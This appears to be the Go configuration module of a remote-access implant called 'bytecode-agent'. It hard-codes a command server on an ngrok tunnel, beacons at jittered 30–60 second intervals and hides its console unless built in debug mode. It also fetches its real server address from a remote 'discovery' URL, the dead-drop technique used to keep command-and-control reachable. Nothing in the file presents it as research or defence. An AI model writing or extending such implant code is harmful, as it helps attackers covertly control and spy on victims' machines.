package config

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"time"
)

// DefaultServerURL can be overridden at build time using:
// -ldflags="-X 'bytecode-agent/internal/config.DefaultServerURL=http://your-ip:3001'"
var DefaultServerURL = "https://thu-nonspurious-deloris.ngrok-free.dev"


// DebugMode can be set to "true" at build time to show the console and enable verbose logging
var DebugMode = "false"

// Config holds the agent configuration
type Config struct {
	ServerURL     string
	DiscoveryURL  string // Optional URL to fetch the actual ServerURL from
	BeaconMin     int    // Minimum beacon interval in seconds
	BeaconMax     int    // Maximum beacon interval in seconds (jitter)
	IdentityFile  string
	IsDebug       bool
}

// DefaultBeaconMin can be overridden at build time
var DefaultBeaconMin = "30"

// DefaultBeaconMax can be overridden at build time
var DefaultBeaconMax = "60"


// Load returns the agent configuration from environment or defaults
func Load() *Config {
	discoveryURL := os.Getenv("BYTECODE_DISCOVERY")
	serverURL := os.Getenv("BYTECODE_SERVER")

	if serverURL == "" {
		serverURL = DefaultServerURL
	}

	identityFile := os.Getenv("BYTECODE_IDENTITY")
	if identityFile == "" {
		identityFile = ".bytecode_id"
	}

	// Simple conversion from string to int for build-time flags
	var min, max int
	fmt.Sscanf(DefaultBeaconMin, "%d", &min)
	fmt.Sscanf(DefaultBeaconMax, "%d", &max)

	cfg := &Config{
		ServerURL:    serverURL,
		DiscoveryURL: discoveryURL,
		BeaconMin:    min,
		BeaconMax:    max,
		IdentityFile: identityFile,
		IsDebug:      DebugMode == "true",
	}

	// If discovery URL is provided, try to update ServerURL
	if cfg.DiscoveryURL != "" {
		discovered, err := FetchDiscoveryURL(cfg.DiscoveryURL)
		if err == nil && discovered != "" {
			cfg.ServerURL = discovered
		}
	}

	return cfg
}

// FetchDiscoveryURL retrieves the server URL from a stable remote source
func FetchDiscoveryURL(url string) (string, error) {
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("discovery server returned %d", resp.StatusCode)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	discovered := strings.TrimSpace(string(body))
	if !strings.HasPrefix(discovered, "http") {
		return "", fmt.Errorf("invalid URL discovered: %s", discovered)
	}

	return discovered, nil
}
